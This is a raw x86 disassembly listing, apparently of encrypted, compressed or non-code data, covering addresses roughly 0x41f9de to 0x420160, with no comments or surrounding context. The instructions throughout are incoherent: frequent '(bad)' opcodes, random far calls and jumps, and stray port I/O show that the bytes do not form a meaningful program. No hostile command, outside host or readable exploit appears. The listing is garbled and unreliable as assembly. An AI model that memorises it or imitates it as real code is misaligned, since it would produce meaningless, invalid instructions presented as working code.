  41f9de:	sub    DWORD PTR [eax+0x39abd510],ebx
  41f9e4:	into   
  41f9e5:	sbb    DWORD PTR [esi],ebp
  41f9e7:	adc    ecx,esi
  41f9e9:	sahf   
  41f9ea:	stc    
  41f9eb:	pop    eax
  41f9ec:	enter  0x22e2,0x72
  41f9f0:	dec    eax
  41f9f1:	(bad)  
  41f9f2:	les    ebx,FWORD PTR [esi+0x4b]
  41f9f5:	cmc    
  41f9f6:	cmp    al,0x73
  41f9f8:	sub    al,0x8b
  41f9fa:	test   DWORD PTR [ebx],0xab4bde6
  41fa00:	adc    DWORD PTR [edx],esi
  41fa02:	jecxz  0x41fa45
  41fa04:	outs   dx,DWORD PTR ds:[esi]
  41fa05:	ss xchg edi,eax
  41fa07:	lahf   
  41fa08:	loope  0x41fa0a
  41fa0a:	aaa    
  41fa0b:	xor    DWORD PTR [edi-0x79],0x54
  41fa0f:	adc    eax,DWORD PTR [esi+0x3352e5b2]
  41fa15:	push   0x3999b1c6
  41fa1a:	sub    eax,eax
  41fa1c:	mov    ecx,esi
  41fa1e:	sbb    eax,0x555afe78
  41fa23:	cmp    DWORD PTR [ebx+0x77ff2fc0],ebp
  41fa29:	push   esp
  41fa2a:	(bad)  
  41fa2b:	ins    DWORD PTR es:[edi],dx
  41fa2c:	repnz and cl,dh
  41fa2f:	sbb    edx,DWORD PTR [edi]
  41fa31:	or     ah,cl
  41fa33:	sub    DWORD PTR [ebx+ebp*1],edi
  41fa36:	xor    dl,BYTE PTR fs:[esi]
  41fa39:	test   eax,0x87d8615
  41fa3e:	call   0x6ecac9c2
  41fa43:	mov    ecx,0xe132d766
  41fa48:	(bad)  
  41fa49:	mov    esp,0x30300fc2
  41fa4e:	xor    eax,0xb2ae1436
  41fa53:	or     eax,DWORD PTR [edi]
  41fa55:	int3   
  41fa56:	pusha  
  41fa57:	cld    
  41fa58:	fneni(8087 only) 
  41fa5a:	mov    ax,ds:0xb2f171be
  41fa60:	and    BYTE PTR [edx+0xfa9b108],ch
  41fa66:	pop    ecx
  41fa67:	sbb    al,0xc3
  41fa69:	out    0x64,al
  41fa6b:	fstp   QWORD PTR [eax+ebx*2-0x36]
  41fa6f:	sbb    DWORD PTR [ecx-0x45],0x95693120
  41fa76:	dec    edi
  41fa77:	jo     0x41fab5
  41fa79:	and    bl,BYTE PTR [ebx]
  41fa7b:	add    al,al
  41fa7d:	cmp    al,0xce
  41fa7f:	jg     0x1dbf81eb
  41fa85:	imul   esi,DWORD PTR [edi+0x5156825d],0x4d
  41fa8c:	pop    edx
  41fa8d:	mov    dh,0xb7
  41fa8f:	sub    cl,cl
  41fa91:	repz xchg ecx,eax
  41fa93:	push   0xfffffff1
  41fa95:	leave  
  41fa96:	xor    dh,ch
  41fa98:	scas   al,BYTE PTR es:[edi]
  41fa99:	sub    al,0x48
  41fa9b:	lods   eax,DWORD PTR ds:[esi]
  41fa9c:	gs in  al,dx
  41fa9e:	(bad)  
  41faa0:	(bad)  
  41faa1:	fbld   TBYTE PTR [edx]
  41faa3:	jecxz  0x41fae2
  41faa5:	in     eax,dx
  41faa6:	xor    ecx,edi
  41faa8:	(bad)  
  41faa9:	ss jb  0x41fa6b
  41faac:	jnp    0x41fa91
  41faae:	fisttp QWORD PTR [ebx-0x1]
  41fab1:	sbb    eax,0x32113fe0
  41fab6:	dec    eax
  41fab7:	repz sti 
  41fab9:	jne    0x41fab1
  41fabb:	addr16 mov esi,0x4dd5b42e
  41fac1:	or     ch,al
  41fac3:	pop    ebp
  41fac4:	(bad)  
  41fac6:	cmp    al,0x96
  41fac8:	outs   dx,DWORD PTR ds:[esi]
  41fac9:	jnp    0x41faa7
  41facb:	repnz out dx,al
  41facd:	push   esp
  41face:	push   eax
  41facf:	pop    ss
  41fad0:	ja     0x41fb21
  41fad2:	daa    
  41fad3:	cmp    al,0x3a
  41fad5:	aam    0xab
  41fad7:	cmp    edx,DWORD PTR [ebp+0x3e]
  41fada:	(bad)  
  41fadb:	add    al,0xeb
  41fadd:	adc    DWORD PTR ds:0xf0bb813,esp
  41fae3:	push   ecx
  41fae4:	cmp    al,0x39
  41fae6:	xor    esp,DWORD PTR [edx+ecx*4-0x1c6737b]
  41faed:	es inc esp
  41faef:	mov    al,ds:0x73652c9d
  41faf4:	clc    
  41faf5:	lods   al,BYTE PTR ds:[esi]
  41faf6:	cwde   
  41faf7:	and    esi,DWORD PTR [eax+0x71]
  41fafa:	and    al,0x3
  41fafc:	mov    ebx,0xa6b70279
  41fb01:	jmp    0x41fadd
  41fb03:	cmp    eax,0xe4bd03ca
  41fb08:	ret    0x3f2c
  41fb0b:	outs   dx,BYTE PTR ds:[esi]
  41fb0c:	sbb    cl,BYTE PTR [ecx]
  41fb0e:	xor    BYTE PTR [esi+ecx*1],dh
  41fb11:	jecxz  0x41fad7
  41fb13:	and    al,0x37
  41fb15:	ins    BYTE PTR es:[edi],dx
  41fb16:	sbb    ecx,edx
  41fb18:	push   ss
  41fb19:	or     ah,al
  41fb1b:	push   ecx
  41fb1c:	inc    edx
  41fb1d:	sub    edi,esp
  41fb1f:	add    eax,0xafa48d4e
  41fb24:	jl     0x41faef
  41fb26:	inc    ebp
  41fb27:	xor    bl,BYTE PTR [esi]
  41fb29:	in     eax,dx
  41fb2a:	popf   
  41fb2b:	cmp    ebp,0x12
  41fb2e:	add    eax,0x16a71567
  41fb33:	arpl   sp,dx
  41fb35:	dec    ecx
  41fb36:	ret    0x12e0
  41fb39:	mov    ds:0x52a9fb9d,eax
  41fb3e:	jns    0x41fbb3
  41fb40:	sbb    eax,0x4924f21c
  41fb45:	into   
  41fb46:	pop    esi
  41fb47:	rcl    DWORD PTR [edx-0x2],0x43
  41fb4b:	imul   esp,ecx,0x3
  41fb4e:	push   edx
  41fb4f:	add    eax,0x11
  41fb52:	call   FWORD PTR [edi]
  41fb54:	fsubr  st,st(1)
  41fb56:	push   ds
  41fb57:	dec    ebx
  41fb58:	pop    edi
  41fb59:	xor    ch,BYTE PTR [edi-0x60d794b3]
  41fb5f:	inc    edx
  41fb60:	cwde   
  41fb61:	sub    ebp,edx
  41fb63:	sub    bl,bh
  41fb65:	sbb    BYTE PTR [edi+0x3b],al
  41fb68:	lahf   
  41fb69:	xchg   esp,eax
  41fb6a:	data16 jl 0x41fb61
  41fb6d:	mov    dl,dh
  41fb6f:	sub    ah,bl
  41fb71:	and    al,0x42
  41fb73:	mov    bl,0xfd
  41fb75:	fnstcw WORD PTR [ebx]
  41fb77:	jae    0x41fb01
  41fb79:	add    bh,BYTE PTR [esi+ecx*8-0x495b007e]
  41fb80:	and    edx,DWORD PTR [edx+0x8a057f5]
  41fb86:	rcpps  xmm7,XMMWORD PTR [edi+0x62]
  41fb8a:	sub    DWORD PTR [esi],esi
  41fb8c:	mov    BYTE PTR [esi],bl
  41fb8e:	or     BYTE PTR [edx+0x719fb56e],dl
  41fb94:	mov    ecx,0x0
	...
  41fba9:	add    BYTE PTR [eax+0x4a],bl
  41fbac:	dec    edx
  41fbad:	push   edi
  41fbae:	pop    edx
  41fbaf:	push   edi
  41fbb0:	pop    ebp
  41fbb1:	dec    edi
  41fbb2:	mov    dh,0x0
  41fbb4:	dec    edx
  41fbb5:	push   ecx
  41fbb6:	cmp    eax,0xf6eef7f9
  41fbbb:	mov    al,BYTE PTR [ecx]
  41fbbd:	add    bl,dl
  41fbbf:	push   es
  41fbc0:	add    BYTE PTR [eax],al
  41fbc2:	fwait
  41fbc3:	dec    ebp
  41fbc4:	push   ss
  41fbc5:	jg     0x41fbb7
  41fbc7:	sbb    esp,ebp
  41fbc9:	xor    DWORD PTR [edx+ecx*2+0xc],0xffffffc6
  41fbce:	shl    BYTE PTR [ebp-0x696415c5],1
  41fbd4:	ror    BYTE PTR [edi],0xae
  41fbd7:	in     al,dx
  41fbd8:	inc    esp
  41fbd9:	iret   
  41fbda:	cs aaa 
  41fbdc:	dec    esp
  41fbdd:	inc    edx
  41fbde:	xchg   DWORD PTR [edx-0x12b3ebb9],ebp
  41fbe4:	push   ss
  41fbe5:	cmp    esp,edx
  41fbe7:	cwde   
  41fbe8:	scas   eax,DWORD PTR es:[edi]
  41fbe9:	retf   0xf802
  41fbec:	inc    edi
  41fbed:	xchg   edx,eax
  41fbee:	push   ebx
  41fbef:	bound  eax,QWORD PTR [eax-0x65]
  41fbf2:	xor    DWORD PTR [edi+0x7b59d0bf],esi
  41fbf8:	std    
  41fbf9:	daa    
  41fbfa:	rcl    BYTE PTR [edi],1
  41fbfc:	jnp    0x41fc03
  41fbfe:	jb     0x41fbf3
  41fc00:	nop
  41fc01:	pop    ss
  41fc02:	push   es
  41fc03:	bound  ecx,QWORD PTR [ebp-0x1]
  41fc06:	xchg   edi,eax
  41fc07:	adc    ch,BYTE PTR [esi]
  41fc09:	xchg   esp,eax
  41fc0a:	or     ch,BYTE PTR [edi+0x16bc5429]
  41fc10:	or     ecx,DWORD PTR [ecx-0x766f7229]
  41fc16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc17:	jne    0x41fbf1
  41fc19:	mov    ebp,0xf6047a4c
  41fc1e:	int    0x4c
  41fc20:	aaa    
  41fc21:	test   eax,0x73ece839
  41fc26:	mov    edx,ebx
  41fc28:	rsqrtps xmm0,XMMWORD PTR [edx-0x1f]
  41fc2c:	or     al,0x81
  41fc2e:	stos   DWORD PTR es:[edi],eax
  41fc2f:	loopne 0x41fc51
  41fc31:	fld    QWORD PTR [esi]
  41fc33:	stc    
  41fc34:	inc    edx
  41fc35:	add    cl,BYTE PTR [esi]
  41fc37:	jmp    0x8e0157c0
  41fc3c:	mov    cl,0x3b
  41fc3e:	or     BYTE PTR [eax],ch
  41fc40:	call   0x5835d7c6
  41fc45:	cli    
  41fc46:	sbb    eax,0xea6901bf
  41fc4b:	dec    ebx
  41fc4c:	out    0x28,al
  41fc4e:	xor    eax,0xf9165d46
  41fc53:	int    0x90
  41fc55:	ins    BYTE PTR es:[edi],dx
  41fc56:	add    eax,edi
  41fc58:	inc    ebx
  41fc59:	adc    DWORD PTR [esi+eax*8],eax
  41fc5c:	arpl   WORD PTR [esi-0x1d],bx
  41fc5f:	push   esp
  41fc60:	sub    al,0xec
  41fc62:	int    0x48
  41fc64:	int3   
  41fc65:	inc    ebp
  41fc66:	cmp    eax,0xa32d0388
  41fc6b:	and    eax,0x90eb0731
  41fc70:	sub    DWORD PTR [eax+0x4a30b7ea],esi
  41fc76:	in     al,0x13
  41fc78:	stos   BYTE PTR es:[edi],al
  41fc79:	sub    eax,0x40815c83
  41fc7e:	(bad)  
  41fc7f:	stc    
  41fc80:	jecxz  0x41fc92
  41fc82:	cmp    BYTE PTR gs:[esi-0x1fb42237],dl
  41fc89:	in     eax,0x41
  41fc8b:	mov    ds:0x1478bfad,eax
  41fc90:	jbe    0x41fc9c
  41fc92:	jbe    0x41fcac
  41fc94:	lock xchg ebp,eax
  41fc96:	cld    
  41fc97:	stos   BYTE PTR es:[edi],al
  41fc98:	mov    ah,0x10
  41fc9a:	xor    eax,0xc98e6981
  41fc9f:	aas    
  41fca0:	arpl   WORD PTR [edi-0x1dadb7fd],sp
  41fca6:	outs   dx,BYTE PTR ds:[esi]
  41fca7:	out    0xdb,al
  41fca9:	jno    0x41fcf1
  41fcab:	int    0x41
  41fcad:	or     al,0x7b
  41fcaf:	xlat   BYTE PTR ds:[ebx]
  41fcb0:	adc    al,0x9b
  41fcb2:	popa   
  41fcb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcb4:	fld    TBYTE PTR [edx+0x2e]
  41fcb7:	mov    ch,0x84
  41fcb9:	ret    0x2df4
  41fcbc:	dec    eax
  41fcbd:	lahf   
  41fcbe:	aas    
  41fcbf:	mov    DWORD PTR [edi+0x22],ebp
  41fcc2:	call   0x2dc49a3d
  41fcc7:	popa   
  41fcc8:	pop    eax
  41fcc9:	cmp    eax,0xf9188d03
  41fcce:	xor    ebp,DWORD PTR ds:0xf16fa196
  41fcd4:	xchg   edx,eax
  41fcd5:	(bad)  
  41fcd6:	in     eax,dx
  41fcd7:	add    bl,dl
  41fcd9:	imul   ebx,edi,0x1dfdf189
  41fcdf:	inc    esi
  41fce0:	xor    DWORD PTR [edx],ebx
  41fce2:	jbe    0x41fcc5
  41fce4:	xchg   edi,eax
  41fce5:	mov    BYTE PTR [ecx-0x3b3b0b9f],dh
  41fceb:	mov    ah,0xc0
  41fced:	adc    eax,0x11d3e89e
  41fcf2:	ins    BYTE PTR es:[edi],dx
  41fcf3:	mov    bh,0x71
  41fcf5:	mov    al,0xe1
  41fcf7:	lock fadd QWORD PTR [esi+0x13151a15]
  41fcfe:	mov    dl,BYTE PTR [edx+0x43a4d01b]
  41fd04:	in     al,0xb8
  41fd06:	ins    DWORD PTR es:[edi],dx
  41fd07:	add    eax,0xd4cd75ee
  41fd0c:	or     eax,0x84ad5d82
  41fd11:	or     al,0xb8
  41fd13:	sahf   
  41fd14:	mov    ebp,0x967f5956
  41fd19:	cs (bad) 
  41fd1b:	call   0x833aa8fd
  41fd20:	mov    ecx,0xcb5f1485
  41fd25:	fwait
  41fd26:	das    
  41fd27:	sub    edx,DWORD PTR [esi-0x6d]
  41fd2a:	jg     0x41fd7b
  41fd2c:	cld    
  41fd2d:	cmc    
  41fd2e:	jle    0x41fd4a
  41fd30:	and    DWORD PTR [ebx],edx
  41fd32:	(bad)  
  41fd34:	dec    ecx
  41fd35:	rcr    BYTE PTR [edi+0x54],0xdf
  41fd39:	jp     0x41fcf0
  41fd3b:	mov    ds:0x92acfec6,al
  41fd41:	es inc ecx
  41fd43:	data16 jecxz 0x41fcee
  41fd46:	aas    
  41fd47:	and    eax,0xdc9c03bd
  41fd4c:	mov    al,ds:0x94fd56b7
  41fd51:	and    DWORD PTR [ebp*8+0x51260a3a],0xffffffa4
  41fd59:	add    ecx,edx
  41fd5b:	mov    ch,0x19
  41fd5d:	push   edi
  41fd5e:	or     eax,0x8e4c9d3b
  41fd63:	inc    edx
  41fd64:	add    ecx,0xffffff8d
  41fd67:	xor    ah,dl
  41fd69:	imul   esi,DWORD PTR [esi],0xffffffc1
  41fd6c:	dec    edx
  41fd6d:	in     eax,dx
  41fd6e:	sub    eax,0xbc9bea1f
  41fd73:	rol    DWORD PTR [esi],0x39
  41fd76:	mov    edi,0x526f331
  41fd7b:	xchg   ebx,eax
  41fd7c:	dec    ecx
  41fd7d:	mov    cl,0xd8
  41fd7f:	xor    ebx,DWORD PTR [esi-0x6c9a9d4b]
  41fd85:	pop    es
  41fd86:	(bad)  
  41fd87:	(bad)  
  41fd88:	shl    BYTE PTR [edi+0x72],cl
  41fd8b:	xchg   ecx,eax
  41fd8c:	push   ebx
  41fd8d:	dec    edi
  41fd8e:	mov    ebx,0xd6884070
  41fd93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd94:	adc    eax,0x4bd47769
  41fd99:	mov    WORD PTR [eax+0x41],cs
  41fd9c:	xlat   BYTE PTR ds:[ebx]
  41fd9d:	aam    0x41
  41fd9f:	pop    eax
  41fda0:	outs   dx,BYTE PTR ds:[esi]
  41fda1:	push   cs
  41fda2:	and    al,0x55
  41fda4:	mov    bh,0xc6
  41fda6:	repnz shl BYTE PTR [ebp+0x7e46bcb3],1
  41fdad:	cs xchg esi,eax
  41fdaf:	jns    0x41fdbf
  41fdb1:	stc    
  41fdb2:	add    DWORD PTR [edi-0x96c3a8],0x78
  41fdb9:	(bad)  
  41fdba:	repnz cmp BYTE PTR [edx-0x6d],dh
  41fdbe:	mov    ?,ebx
  41fdc0:	adc    al,0xab
  41fdc2:	popa   
  41fdc3:	sub    BYTE PTR [ebx],bh
  41fdc5:	cli    
  41fdc6:	stos   DWORD PTR es:[edi],eax
  41fdc7:	rol    esp,1
  41fdc9:	popa   
  41fdca:	and    esp,DWORD PTR [ebp-0x48]
  41fdcd:	nop
  41fdce:	shl    edi,0x2c
  41fdd1:	push   edi
  41fdd2:	cmp    al,0x15
  41fdd4:	dec    edx
  41fdd5:	and    cl,BYTE PTR [edx]
  41fdd7:	xchg   DWORD PTR [edx-0x44371ef4],edi
  41fddd:	jmp    0x41fd69
  41fddf:	or     al,BYTE PTR [esp+ecx*8+0x58]
  41fde3:	cmp    al,BYTE PTR [esi]
  41fde5:	call   0x87e04aa2
  41fdea:	jo     0x41fdc3
  41fdec:	loope  0x41fe1e
  41fdee:	gs or  al,0xc2
  41fdf1:	jbe    0x41fdf7
  41fdf3:	scas   al,BYTE PTR es:[edi]
  41fdf4:	and    al,0xdd
  41fdf6:	or     cl,cl
  41fdf8:	fist   WORD PTR [ecx+0x25]
  41fdfb:	dec    eax
  41fdfc:	cmp    BYTE PTR [esi-0x24],al
  41fdff:	jae    0x41fe69
  41fe01:	xor    edi,DWORD PTR [edx-0x27]
  41fe04:	call   0x3c1:0x2e968d07
  41fe0b:	icebp  
  41fe0c:	mov    cl,0x8b
  41fe0e:	ss jns 0x41fdd5
  41fe11:	out    0xbf,al
  41fe13:	push   0xffffffde
  41fe15:	fimul  DWORD PTR [edx]
  41fe17:	xor    eax,0xc76d1cdc
  41fe1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe1d:	cmp    BYTE PTR [esi-0x192b1ac4],dh
  41fe23:	ret    0xfd62
  41fe26:	xchg   esp,eax
  41fe27:	push   0x638e33c2
  41fe2c:	jnp    0x41fdf3
  41fe2e:	out    0x83,eax
  41fe30:	inc    ebp
  41fe31:	mov    ebx,0x3de076a4
  41fe36:	cli    
  41fe37:	fs push edx
  41fe39:	pop    edx
  41fe3a:	sbb    ah,BYTE PTR [ebp-0x18963e6d]
  41fe40:	dec    ecx
  41fe41:	ror    edi,1
  41fe43:	and    al,0x15
  41fe45:	cdq    
  41fe46:	pushf  
  41fe47:	xlat   BYTE PTR ds:[ebx]
  41fe48:	push   ebp
  41fe49:	mov    esi,ebp
  41fe4b:	pop    esp
  41fe4c:	cmc    
  41fe4d:	adc    eax,0x513ce2c5
  41fe52:	mov    edi,DWORD PTR [ecx-0x31]
  41fe55:	adc    BYTE PTR [ebp-0x20b28565],ah
  41fe5b:	inc    edi
  41fe5c:	scas   eax,DWORD PTR es:[edi]
  41fe5d:	inc    ebp
  41fe5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe5f:	fist   DWORD PTR [eax]
  41fe61:	cmc    
  41fe62:	sub    al,0xb3
  41fe64:	cmp    BYTE PTR [bx+di-0x21],ch
  41fe68:	xor    eax,0x55e3fce
  41fe6d:	ror    DWORD PTR [edx+0xf],0xc7
  41fe71:	mov    eax,ds:0x369ac3ba
  41fe76:	push   ds
  41fe77:	sbb    esp,DWORD PTR [edx+0x69ea21a7]
  41fe7d:	sub    BYTE PTR [esi],dl
  41fe7f:	sbb    BYTE PTR [eax],cl
  41fe81:	fwait
  41fe82:	xchg   edi,eax
  41fe83:	or     bl,BYTE PTR ds:0x85b27444
  41fe89:	and    eax,0x78ed90d4
  41fe8e:	jl     0x41fe14
  41fe90:	cmp    BYTE PTR [ecx],cl
  41fe92:	adc    eax,0x1b73080c
  41fe97:	or     DWORD PTR [edx],eax
  41fe99:	sbb    eax,0xc0cabfb0
  41fe9e:	call   0xc9be336a
  41fea3:	fisub  DWORD PTR [eax-0x31]
  41fea6:	fcmovnbe st,st(3)
  41fea8:	cs cmp eax,0xb24ec8cf
  41feae:	mov    ch,0x25
  41feb0:	out    0x71,eax
  41feb2:	mov    dl,0x72
  41feb4:	icebp  
  41feb5:	leave  
  41feb6:	test   al,0x90
  41feb8:	cmp    bl,bh
  41feba:	xchg   DWORD PTR [edx-0x6071d749],edx
  41fec0:	lds    eax,FWORD PTR [edx+0x5e]
  41fec3:	nop
  41fec4:	js     0x41ff11
  41fec6:	sub    dl,bl
  41fec8:	fistp  QWORD PTR [ebp+edx*1-0x4bbaeaec]
  41fecf:	or     ah,bh
  41fed1:	jmp    0x11b8:0xcc92280e
  41fed8:	inc    eax
  41fed9:	sbb    al,BYTE PTR ds:0x1362076d
  41fedf:	jns    0x41fe6a
  41fee1:	fdivr  DWORD PTR [ebx+0x1562b285]
  41fee7:	mov    ecx,fs
  41fee9:	xchg   esi,eax
  41feea:	das    
  41feeb:	inc    ebp
  41feec:	push   ecx
  41feed:	ins    DWORD PTR es:[edi],dx
  41feee:	pop    edi
  41feef:	or     DWORD PTR [eax],esp
  41fef1:	int    0x59
  41fef3:	rcr    BYTE PTR [edx-0x3d],0xe8
  41fef7:	fstp   DWORD PTR [edx-0x68]
  41fefa:	loope  0x41fef7
  41fefc:	ja     0x41ff60
  41fefe:	call   0x503b:0x1be302cc
  41ff05:	lahf   
  41ff06:	mov    bl,0x11
  41ff08:	sbb    bh,BYTE PTR [eiz*8+0x634c7b]
  41ff0f:	sti    
  41ff10:	fwait
  41ff11:	dec    ebx
  41ff12:	scas   eax,DWORD PTR es:[edi]
  41ff13:	dec    esi
  41ff14:	xor    DWORD PTR [edi+0x4d],edi
  41ff17:	scas   al,BYTE PTR es:[edi]
  41ff18:	mov    ds:0x6c5d8f9c,al
  41ff1d:	cmp    BYTE PTR [ebx+0x6db29aaa],bl
  41ff23:	pop    eax
  41ff24:	dec    ecx
  41ff25:	xor    al,BYTE PTR [ecx+edi*2-0x7e58f630]
  41ff2c:	(bad)  
  41ff2d:	xor    ebp,DWORD PTR [edx-0x38b4e21c]
  41ff33:	jns    0x41ff69
  41ff35:	pop    ebp
  41ff36:	test   bl,0xeb
  41ff39:	jae    0x41ff32
  41ff3b:	aad    0xf2
  41ff3d:	push   edx
  41ff3e:	idiv   DWORD PTR [esi]
  41ff40:	cmp    dl,al
  41ff42:	lods   eax,DWORD PTR ds:[esi]
  41ff43:	push   cs
  41ff44:	test   eax,0xe01ff721
  41ff49:	cmp    edi,DWORD PTR ds:0xff449189
  41ff4f:	stc    
  41ff50:	(bad)  
  41ff52:	(bad)  
  41ff53:	iret   
  41ff54:	rcr    BYTE PTR ds:0x5a4b2999,0x6b
  41ff5b:	inc    esp
  41ff5c:	call   0xeb14:0x7f2aebbf
  41ff63:	push   es
  41ff64:	aam    0x59
  41ff66:	adc    BYTE PTR [eax+esi*8-0x9],al
  41ff6a:	sub    bh,BYTE PTR [ecx+eax*1-0x58]
  41ff6e:	mov    al,0x3a
  41ff70:	xchg   bh,ch
  41ff72:	lahf   
  41ff73:	and    al,0x63
  41ff75:	pop    esi
  41ff76:	(bad)  
  41ff77:	lods   eax,DWORD PTR ds:[esi]
  41ff78:	mov    cl,0xef
  41ff7a:	xchg   edx,eax
  41ff7b:	gs sbb bl,cl
  41ff7e:	ret    0x3de7
  41ff81:	in     eax,dx
  41ff82:	mov    edx,0x62ae7513
  41ff87:	ds inc esp
  41ff89:	mov    ecx,eax
  41ff8b:	sbb    al,0x46
  41ff8d:	stos   BYTE PTR es:[edi],al
  41ff8e:	push   0xffffff92
  41ff90:	add    ebx,esp
  41ff92:	pop    es
  41ff93:	or     al,0x10
  41ff95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff96:	mov    al,0x8
  41ff98:	mov    ax,0x6590
  41ff9c:	and    ecx,eax
  41ff9e:	loop   0x41ff26
  41ffa0:	retf   0x82a7
  41ffa3:	mov    ds,WORD PTR [ebp+0x1e]
  41ffa6:	call   0x140e:0xef05fd76
  41ffad:	mov    al,0xf3
  41ffaf:	and    dl,BYTE PTR [eax+edx*2]
  41ffb2:	xchg   dl,ah
  41ffb4:	nop
  41ffb5:	retf   
  41ffb6:	inc    ebp
  41ffb7:	mov    ebp,0x47d56740
  41ffbc:	je     0x41ff8e
  41ffbe:	cmp    eax,0x63814091
  41ffc3:	popa   
  41ffc4:	(bad)  
  41ffc5:	jl     0x41ff6c
  41ffc7:	(bad)  [ebx-0x21ec06cf]
  41ffcd:	pop    edi
  41ffce:	xchg   ecx,eax
  41ffcf:	int3   
  41ffd0:	xchg   DWORD PTR [edx+0x27],edx
  41ffd3:	inc    ecx
  41ffd4:	mov    al,0xcb
  41ffd6:	dec    esp
  41ffd7:	xchg   DWORD PTR [edi],edi
  41ffd9:	in     eax,dx
  41ffda:	mov    ds:0xb03cc414,eax
  41ffdf:	sbb    ebx,edi
  41ffe1:	sti    
  41ffe2:	jmp    0x41ffde
  41ffe4:	(bad)
  41ffe8:	iret   
  41ffe9:	(bad)  
  41ffea:	mov    ah,0x1a
  41ffec:	jl     0x3b59265b
  41fff2:	push   esp
  41fff3:	popa   
  41fff4:	jmp    0x41ffd8
  41fff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fff7:	mov    eax,ds:0x60f406bc
  41fffc:	clc    
  41fffd:	dec    eax
  41fffe:	jo     0x41ff81
  420000:	adc    BYTE PTR [eax+0x3392fff7],bl
  420006:	gs call 0x48bd:0x8bafe9
  42000e:	or     DWORD PTR [ebx+0x5c],eax
  420011:	shr    ebp,cl
  420013:	test   ebx,eax
  420015:	add    BYTE PTR [eax],0x4d
  420018:	fst    DWORD PTR [ebp-0x37c5706f]
  42001e:	cmp    al,0x89
  420020:	fild   DWORD PTR [edi-0x2f5ee7f4]
  420026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420027:	js     0x41ffcb
  420029:	push   ebx
  42002a:	push   0x200acc76
  42002f:	stos   DWORD PTR es:[edi],eax
  420030:	adc    bl,BYTE PTR [edi]
  420032:	aaa    
  420033:	stos   DWORD PTR es:[edi],eax
  420034:	shl    DWORD PTR [eax],1
  420036:	mov    edx,0x695cd8df
  42003b:	aaa    
  42003c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42003d:	mov    bh,0x97
  42003f:	das    
  420040:	aas    
  420041:	mov    dh,0x13
  420043:	dec    eax
  420044:	mov    ch,BYTE PTR [ebp+0x3d]
  420047:	inc    ecx
  420048:	sbb    BYTE PTR [esi-0x7410f5d4],bh
  42004e:	popf   
  42004f:	inc    edx
  420050:	and    eax,DWORD PTR [ecx]
  420052:	dec    edi
  420053:	test   eax,0x7f59b95f
  420058:	adc    BYTE PTR [esi-0x5bfbeb0f],dh
  42005e:	js     0x420053
  420060:	mov    ah,0xa0
  420062:	xchg   BYTE PTR [ebx],bl
  420064:	sbb    eax,0x94e35ad1
  420069:	test   al,0x2
  42006b:	jge    0x420092
  42006d:	and    al,al
  42006f:	xor    al,0xad
  420071:	sub    ah,BYTE PTR [edi+eax*4-0x48a6e110]
  420078:	xchg   ecx,eax
  420079:	and    ch,al
  42007b:	sub    ebx,eax
  42007d:	xchg   ecx,eax
  42007e:	imul   esi,DWORD PTR [ebx+0x2626bb18],0xffffff83
  420085:	(bad)  
  420086:	stos   DWORD PTR es:[edi],eax
  420087:	shl    dl,cl
  420089:	cmp    dl,BYTE PTR [bx+0x384e]
  42008e:	call   FWORD PTR [ebx]
  420090:	mov    eax,0xf797ec8b
  420095:	dec    esi
  420096:	mov    ebx,0x74d7e0f0
  42009b:	mov    bh,0xd7
  42009d:	push   ss
  42009e:	ret    0x23af
  4200a1:	int3   
  4200a2:	inc    al
  4200a4:	push   ecx
  4200a5:	xchg   DWORD PTR [edi-0x402159e],ebp
  4200ab:	fcomi  st,st(2)
  4200ad:	(bad)  
  4200ae:	std    
  4200af:	mov    fs,WORD PTR [ebp+0x98fa86a]
  4200b5:	mov    cl,0x64
  4200b7:	cmp    BYTE PTR [esi],al
  4200b9:	bound  ebx,QWORD PTR [edx]
  4200bb:	dec    edx
  4200bc:	mov    cl,0xea
  4200be:	add    esp,ebp
  4200c0:	inc    edi
  4200c1:	sub    esp,edi
  4200c3:	mov    esi,0x13e25d6d
  4200c8:	cmp    DWORD PTR [esi-0x19],edi
  4200cb:	jbe    0x420140
  4200cd:	inc    esi
  4200ce:	pop    es
  4200cf:	sub    al,0x7b
  4200d1:	out    0x44,al
  4200d3:	(bad)  
  4200d4:	sar    BYTE PTR [eax],cl
  4200d6:	jge    0x420135
  4200d8:	fcom   DWORD PTR [edx+0x19]
  4200db:	pusha  
  4200dc:	in     eax,0x3e
  4200de:	mov    bh,0xa
  4200e0:	mov    eax,0x64dd90ea
  4200e5:	inc    esi
  4200e6:	push   ss
  4200e7:	add    al,0x69
  4200e9:	or     bl,BYTE PTR [esi+0x7d1e6b9e]
  4200ef:	je     0x420155
  4200f1:	fisttp QWORD PTR [esi]
  4200f3:	sub    BYTE PTR [edi+ebp*1+0x4307a868],0x50
  4200fb:	adc    esp,DWORD PTR [edi+0x489d2b0]
  420101:	das    
  420102:	add    esp,DWORD PTR [eax+0x6ef429a7]
  420108:	lea    eax,[eax-0x79c49724]
  42010e:	xor    DWORD PTR [edx],edi
  420110:	add    al,0x8f
  420112:	push   eax
  420113:	cmp    eax,0x3263cf8d
  420118:	mov    ebp,0x6e0ddccb
  42011d:	test   al,0x75
  42011f:	out    0x8b,eax
  420121:	ss scas al,BYTE PTR es:[edi]
  420123:	aad    0x51
  420125:	test   BYTE PTR [ebx],bl
  420127:	sbb    BYTE PTR [ebx-0x4e],bl
  42012a:	je     0x4200d2
  42012c:	cmc    
  42012d:	sbb    edi,0x45bb912a
  420133:	push   ebp
  420134:	add    al,0x44
  420136:	std    
  420137:	or     al,0x63
  420139:	dec    ebx
  42013a:	sti    
  42013b:	ffreep st(3)
  42013d:	imul   esp,DWORD PTR [edx],0xffffffdb
  420140:	inc    ecx
  420141:	mov    BYTE PTR [esi-0x1808fb87],bl
  420147:	dec    si
  420149:	out    dx,eax
  42014a:	popa   
  42014b:	jl     0x42013a
  42014d:	repnz gs pop edx
  420150:	cmp    DWORD PTR [ecx-0x19],edx
  420153:	mov    ebp,0x37c5f903
  420158:	(bad)  
  420159:	cmp    ah,BYTE PTR [ecx-0x7604ecc2]
  42015f:	(bad)  
  420160:	popa   
